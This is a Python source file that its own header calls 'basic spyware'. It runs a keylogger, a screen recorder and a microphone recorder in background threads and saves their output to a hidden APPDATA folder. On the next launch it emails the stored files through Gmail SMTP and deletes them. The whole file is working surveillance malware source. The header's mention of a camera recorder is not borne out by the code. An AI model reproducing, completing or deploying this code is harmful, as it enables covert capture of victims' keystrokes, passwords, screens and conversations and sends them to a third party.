# basic spyware that acts as a keylogger, screen recorder, audio recorder, microphone recorder and a camera recorder; emails the files when closed

import cv2
import pyaudio
import wave
import threading
import time
import os
import atexit
import shutil
from datetime import datetime
from PIL import ImageGrab
import numpy as np
import keyboard
import platform
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

SCREEN_SIZE = (1920, 1080)
FRAME_RATE = 24
AUDIO_CHUNK_SIZE = 1024
AUDIO_SAMPLE_WIDTH = 2
AUDIO_CHANNELS = 1
AUDIO_RATE = 44100
DATA_FOLDER = os.path.join(os.getenv('APPDATA'), 'DATA')
KEYLOG_FILE = os.path.join(DATA_FOLDER, 'keylog.txt')
SENDER_EMAIL = "x"
SENDER_PASSWORD = "x"
RECIPIENT_EMAIL = "x"

def send_email(subject, body, attachment):
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEBase('application', 'octet-stream'))
    
    with open(attachment, 'rb') as file:
        attachment_data = MIMEBase('application', 'octet-stream')
        attachment_data.set_payload(file.read())
        encoders.encode_base64(attachment_data)
        attachment_data.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
        msg.attach(attachment_data)
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    server.send_message(msg)
    server.quit()

def check_existing_files():
    existing_files = os.listdir(DATA_FOLDER)
    if existing_files:
        for file_name in existing_files:
            file_path = os.path.join(DATA_FOLDER, file_name)
            send_email("Recorded Data", "Attached are the recorded files.", file_path)
            os.remove(file_path)


def create_data_folder():
    os.makedirs(DATA_FOLDER, exist_ok=True)

def get_video_file_path():
    current_time = datetime.now().strftime("%H-%M_%d-%m-%Y")
    return os.path.join(DATA_FOLDER, f'screenFootage_{current_time}.avi')

def get_audio_file_path():
    current_time = datetime.now().strftime("%H-%M_%d-%m-%Y")
    return os.path.join(DATA_FOLDER, f'audio_{current_time}.wav')

def start_video_recording():
    video_file = get_video_file_path()
    video_writer = cv2.VideoWriter(video_file, cv2.VideoWriter_fourcc(*"XVID"), FRAME_RATE, SCREEN_SIZE)

    while is_video_recording:
        frame = ImageGrab.grab(bbox=(0, 0, SCREEN_SIZE[0], SCREEN_SIZE[1]))
        frame = frame.resize(SCREEN_SIZE)
        frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
        video_writer.write(frame)

    video_writer.release()

def start_audio_recording():
    audio_file = get_audio_file_path()
    audio_frames = []
    audio_stream = pyaudio.PyAudio().open(format=pyaudio.paInt16,
                                          channels=AUDIO_CHANNELS,
                                          rate=AUDIO_RATE,
                                          input=True,
                                          output=True,
                                          frames_per_buffer=AUDIO_CHUNK_SIZE)

    while is_audio_recording:
        audio_data = audio_stream.read(AUDIO_CHUNK_SIZE)
        audio_frames.append(audio_data)

    audio_stream.stop_stream()
    audio_stream.close()

    audio_file = wave.open(audio_file, 'wb')
    audio_file.setnchannels(AUDIO_CHANNELS)
    audio_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
    audio_file.setframerate(AUDIO_RATE)
    audio_file.writeframes(b''.join(audio_frames))
    audio_file.close()

def start_keylogger():
    global is_keylogger_running
    is_keylogger_running = True

    with open(KEYLOG_FILE, "w") as f:
        pass

    keyboard.on_press(lambda event: on_press(event))

    while is_keylogger_running:
        time.sleep(1)

    keyboard.unhook_all()

def on_press(event):
    key = event.name
    with open(KEYLOG_FILE, "a") as f:
        if key in ["space", "backspace", "shift", "esc"]:
            f.write("\n" + key + "\n")
        else:
            f.write(key)


def save_recordings():
    stop_video_recording()
    stop_audio_recording()
    stop_keylogger()

    if platform.system() == "Windows":
        final_video_path = os.path.join(DATA_FOLDER, os.path.basename(get_video_file_path()))
        final_audio_path = os.path.join(DATA_FOLDER, os.path.basename(get_audio_file_path()))
        shutil.move(get_video_file_path(), final_video_path)
        shutil.move(get_audio_file_path(), final_audio_path)

def stop_video_recording():
    global is_video_recording
    is_video_recording = False


def stop_audio_recording():
    global is_audio_recording
    is_audio_recording = False

def stop_keylogger():
    global is_keylogger_running
    is_keylogger_running = False

def cleanup():
    save_recordings()
    os.remove(KEYLOG_FILE)

def start_recording():
    create_data_folder()

    global is_video_recording, is_audio_recording, is_keylogger_running
    is_video_recording = True
    is_audio_recording = True
    is_keylogger_running = True

    video_thread = threading.Thread(target=start_video_recording)
    audio_thread = threading.Thread(target=start_audio_recording)
    keylogger_thread = threading.Thread(target=start_keylogger)

    video_thread.start()
    audio_thread.start()
    keylogger_thread.start()

if __name__ == "__main__":
    check_existing_files()
    atexit.register(cleanup)
    start_recording()

    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop_video_recording()
            stop_audio_recording()
            stop_keylogger()
            break
